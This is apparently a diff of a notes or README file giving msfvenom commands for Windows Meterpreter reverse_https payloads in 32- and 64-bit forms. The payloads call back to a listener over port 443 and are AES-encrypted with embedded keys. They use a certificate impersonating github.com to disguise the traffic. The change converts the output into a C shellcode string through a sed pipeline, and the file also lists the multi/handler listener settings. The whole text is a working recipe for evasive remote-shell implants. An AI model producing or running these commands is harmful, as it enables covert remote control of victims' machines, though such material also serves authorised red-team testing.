@@ -43,7 +43,7 @@
 
     To generate msf5 payload
 
-    WIN32 ./msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f psh
+    WIN32 ./msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2-
 
     exploit/multi/handler
 
@@ -65,7 +65,7 @@
     stagerverifysslcert => true
 
 
-    x64 ./msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=/Users/starfish/.msf4/loot/20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f psh 
+    x64 ./msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 LHOST=192.168.1.5 EXITFUNC=thread handlercert=./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem stagerverifycert=true --encrypt aes256 --encrypt-key 8URNrTemdhwYaiMSy146sT2Rf3BDsffZ --encrypt-iv I9d4aFY93D0MsZ3k -f  c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
 
     exploit/multi/handler
 
